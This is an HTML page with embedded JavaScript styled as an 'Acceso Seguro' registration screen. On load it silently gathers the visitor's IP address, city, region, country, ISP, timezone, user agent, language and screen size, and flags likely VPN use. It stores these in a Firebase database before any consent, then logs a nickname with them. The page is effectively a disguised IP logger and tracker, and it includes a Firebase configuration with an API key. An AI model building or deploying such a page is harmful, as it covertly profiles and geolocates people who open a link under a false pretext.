<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Acceso Seguro</title>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { 
  getFirestore, doc, runTransaction, addDoc, collection 
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBIp6rof_Wa5wyWdJQwjYWOQRu86ghZjtM",
  authDomain: "track-5ec5f.firebaseapp.com",
  projectId: "track-5ec5f"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const wait = (ms) => new Promise(r => setTimeout(r, ms));

// 🧠 función anti-freeze
async function safe(promise, fallback) {
  try {
    return await Promise.race([
      promise,
      new Promise(resolve => setTimeout(() => resolve(fallback), 5000))
    ]);
  } catch {
    return fallback;
  }
}

// 🌐 IP
async function getIPData() {
  let data = await safe(fetch("https://ipapi.co/json/").then(r => r.json()), null);

  if (!data) {
    return {
      ipv4: "No disponible",
      ipv6: "No disponible",
      ciudad: "Desconocido",
      region: "Desconocido",
      pais: "Desconocido",
      isp: "Desconocido",
      timezone: "Desconocido",
      vpn: false
    };
  }

  let ip = data.ip || "No disponible";

  let vpn = false;
  let isp = (data.org || "").toLowerCase();

  if (data.proxy === true) vpn = true;

  if (
    isp.includes("amazon") ||
    isp.includes("google") ||
    isp.includes("digitalocean") ||
    isp.includes("microsoft") ||
    isp.includes("cloudflare")
  ) vpn = true;

  return {
    ipv4: ip,
    ipv6: ip.includes(":") ? ip : "No disponible",
    ciudad: data.city,
    region: data.region,
    pais: data.country_name,
    isp: data.org,
    timezone: data.timezone,
    vpn
  };
}

// 🔢 contador (no bloquea)
async function getVisitorNumber() {
  try {
    const ref = doc(db, "meta", "contador");

    return await safe(runTransaction(db, async (transaction) => {
      const snap = await transaction.get(ref);
      let numero = snap.exists() ? snap.data().valor + 1 : 1;
      transaction.set(ref, { valor: numero });
      return numero;
    }), Math.floor(Math.random() * 9999));

  } catch {
    return Math.floor(Math.random() * 9999);
  }
}

// 💻 dispositivo
function getDevice() {
  return {
    userAgent: navigator.userAgent,
    idioma: navigator.language,
    resolucion: screen.width + "x" + screen.height
  };
}


// 🚀 INICIO
let datosBase = {};
let visitanteNumero = 0;

document.body.innerHTML = "<h2>Conectando...</h2>";

(async () => {

  await wait(500);

  document.body.innerHTML = "<h2>Analizando conexión... ⏳</h2>";

  // ⚡ en paralelo (CLAVE)
  let [ip, numero] = await Promise.all([
    getIPData(),
    getVisitorNumber()
  ]);

  visitanteNumero = numero;

  datosBase = {
    visitante: visitanteNumero,
    ...ip,
    ...getDevice(),
    fecha: new Date().toISOString()
  };

  // 💾 guardar sin bloquear
  safe(addDoc(collection(db, "En bruto"), datosBase), null);

  await wait(300);

  document.body.innerHTML = `
    <h1>Sistema de registro</h1>
    <p>Eres el visitante #${visitanteNumero}</p>
    <input id="nick" placeholder="Tu apodo">
    <br><br>
    <button id="btn">Continuar</button>
  `;

  document.getElementById("btn").onclick = guardar;

})();


// 💾 guardar
async function guardar() {

  let nick = document.getElementById("nick").value || "Anónimo";

  document.body.innerHTML = "<h2>Procesando...</h2>";

  let datosFinal = { ...datosBase, nick };

  safe(addDoc(collection(db, "logs"), datosFinal), null);

  let avisoVPN = datosFinal.vpn
    ? "<span style='color:red;'>⚠ VPN DETECTADO</span>"
    : "<span style='color:lime;'>✔ Normal</span>";

  document.body.innerHTML = `
    <h1>✔ Registrado</h1>
    <p>#${datosFinal.visitante}</p>
    <p>${nick}</p>

    <p>IPv4: ${datosFinal.ipv4}</p>
    <p>IPv6: ${datosFinal.ipv6}</p>
    <p>${avisoVPN}</p>

    <p>${datosFinal.ciudad}, ${datosFinal.region}</p>
  `;
}

</script>
</head>

<body style="background:black;color:#00ff00;font-family:monospace;text-align:center;margin-top:50px;">
</body>
</html>
